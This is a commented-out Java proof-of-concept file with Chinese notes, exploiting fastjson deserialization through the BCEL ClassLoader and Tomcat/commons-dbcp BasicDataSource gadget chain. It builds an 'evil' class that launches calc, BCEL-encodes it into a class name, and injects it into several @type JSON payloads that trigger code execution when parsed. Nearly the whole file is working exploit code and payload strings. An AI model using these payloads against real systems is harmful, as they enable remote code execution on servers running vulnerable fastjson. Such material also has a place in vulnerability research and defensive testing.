//package com.MyUtils.poc;
//
//import evilClass.*;
//import com.alibaba.fastjson.JSONObject;
//import com.sun.org.apache.bcel.internal.classfile.Utility;
//
///*
// * 基于org.apache.tomcat.dbcp.dbcp.BasicDataSource的PoC，当然也可以说是基于com.sun.org.apache.bcel.internal.util.ClassLoader的PoC
// * 前者的主要作用是触发，也就是包含Class.forName()函数的逻辑(createConnectionFactory函数中)；后者是类加载器，可以解析特定格式的类byte[]。
// *
// *
// * org.apache.tomcat.dbcp.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-7.0.65.jar
// * org.apache.tomcat.dbcp.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp 比如tomcat-dbcp-9.0.13.jar
// * org.apache.commons.dbcp.BasicDataSource ----- https://mvnrepository.com/artifact/commons-dbcp/commons-dbcp
// * org.apache.commons.dbcp2.BasicDataSource ----- https://mvnrepository.com/artifact/org.apache.commons/commons-dbcp2
// *
// * 主要参考：https://xz.aliyun.com/t/2272
// */
//public class PoC2dbcp {
//    public static void main(String[] argv){
//        String xx = payload2();
//    }
//
//    public static String payload2() {
//        //payload3:https://xz.aliyun.com/t/2272
//        try {
//            String payload2 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
////          payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
////          payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
////          payload3 = "{{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"c\":{\"@type\":\"org.apache.commons.dbcp2.BasicDataSource\",\"driverClassLoader\":{\"@type\":\"com.sun.org.apache.bcel.internal.util.ClassLoader\"},\"driverClassName\":\"xxxxxxxxxx\"}}:\"ddd\"}";
//            byte[] bytecode = createEvilClass.create("evil","calc");
//            String classname = Utility.encode(bytecode,true);
//            //System.out.println(classname);
//            classname = "org.apache.log4j.spi$$BCEL$$"+classname;
//            payload2 = payload2.replace("xxxxxxxxxx", classname);
//
////          ClassLoader cls = new com.sun.org.apache.bcel.internal.util.ClassLoader();
////          Class.forName(classname, true, cls);
//            JSONObject.parseObject(payload2);
//            return payload2;
//        } catch (Exception e) {
//            e.printStackTrace();
//            return null;
//        }
//    }
//}
